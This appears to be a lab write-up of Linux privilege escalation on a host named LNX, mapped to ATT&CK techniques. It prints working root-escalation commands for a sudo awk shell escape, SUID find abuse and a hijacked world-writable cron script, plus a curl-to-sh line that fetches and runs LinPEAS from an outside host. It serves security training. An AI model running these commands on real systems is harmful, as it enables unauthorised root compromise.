# Privilege Escalation — LNX

**ATT&CK Techniques:** T1548.001 · T1053.003 · T1548.003

---

## Objective

Escalate from a low-privilege shell as `starboy` to `root` on LNX using three independent privilege escalation vectors discovered via LinPEAS enumeration.

---

## Environment

| Property | Value |
|---|---|
| Target | LNX — 192.168.60.10 |
| Starting shell | starboy (uid=1000, no sudo group) |
| Goal | root (uid=0) + root flag |

---

## Tools Used

- LinPEAS
- GTFOBins (reference)
- Built-in bash/shell utilities

---

## Enumeration

Ran LinPEAS as `starboy` to identify privilege escalation vectors:

```bash
curl http://10.8.0.2:8000/linpeas.sh | sh 2>/dev/null
```

LinPEAS flagged three high-value findings:

```
User starboy may run the following commands on LNX:
    (root) NOPASSWD: /usr/bin/awk

-rwsr-xr-x 1 root root 228K Aug 10 2024 /usr/bin/find

/opt/scripts/root-backup.sh   [permissions: rwxrwxrwx, owner: root]
```

---

## PE Vector 1: Sudo Misconfiguration — awk (T1548.003)

`starboy` can run `/usr/bin/awk` as root without a password. Per GTFOBins, `awk` can spawn a shell when executed with sudo.

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
```

**Output:**
```
# whoami
root
# cat /root/root.txt
root{full_root_via_pe_vector}
```

Root shell obtained immediately. Root flag captured.

---

## PE Vector 2: SUID Binary — find (T1548.001)

`/usr/bin/find` has the SUID bit set (`-rwsr-xr-x`), meaning it executes with the file owner's privileges (root) regardless of who runs it. Per GTFOBins, `find` can execute arbitrary commands via `-exec`.

```bash
find . -exec /bin/sh -p \; -quit
```

The `-p` flag tells sh to preserve the effective UID from the SUID binary.

**Output:**
```
# whoami
root
```

Root shell obtained via SUID abuse.

---

## PE Vector 3: Cron Job Hijack — Writable Script (T1053.003)

`/opt/scripts/root-backup.sh` is executed every minute by a root-owned cron job (`/etc/cron.d/backup-job`) and has world-writable permissions (`rwxrwxrwx`). Any user can overwrite it with a malicious payload.

Overwrote the script to set SUID on `/bin/bash`:
```bash
echo -e '#!/bin/bash\nchmod u+s /bin/bash' > /opt/scripts/root-backup.sh
```

Waited ~60 seconds for cron to execute the script, then verified:
```bash
ls -la /bin/bash
```
```
-rwsr-xr-x 1 root root 1298416 May 9 07:07 /bin/bash
```

Spawned a privileged bash shell:
```bash
/bin/bash -p
```

**Output:**
```
bash-5.2# whoami
root
bash-5.2# id
uid=1000(starboy) gid=1000(starboy) euid=0(root) groups=1000(starboy),...
```

Effective UID = 0 (root) confirmed via cron-based privilege escalation.

Restored original cron script after exploitation:
```bash
echo -e '#!/bin/bash\necho "backup running" >> /var/log/backup.log' > /opt/scripts/root-backup.sh
chmod u-s /bin/bash
```

---

## ATT&CK Mapping

| Technique ID | Name | Description |
|---|---|---|
| T1548.003 | Sudo and Sudo Caching | starboy allowed to run awk as root (NOPASSWD) — spawned root shell via GTFOBins |
| T1548.001 | Setuid and Setgid | SUID bit on /usr/bin/find — executed shell with root euid via -exec flag |
| T1053.003 | Scheduled Task/Job: Cron | World-writable root cron script overwritten with payload — bash SUID set on next execution |

---

## Key Takeaways

- Overly permissive sudo rules (especially NOPASSWD on scripting utilities like awk, perl, python) are immediately exploitable via GTFOBins with zero additional tooling
- SUID bits on utilities like find, vim, or python are a classic and consistent finding in misconfigured Linux environments
- Cron jobs running as root that execute user-writable scripts are one of the most common and impactful Linux PE vectors in real engagements — always check /etc/cron*, /var/spool/cron, and /opt/ for writable scripts
- LinPEAS surfaces all three of these vectors reliably and color-codes them as high priority — running it immediately after gaining a low-priv shell should be a standard first step
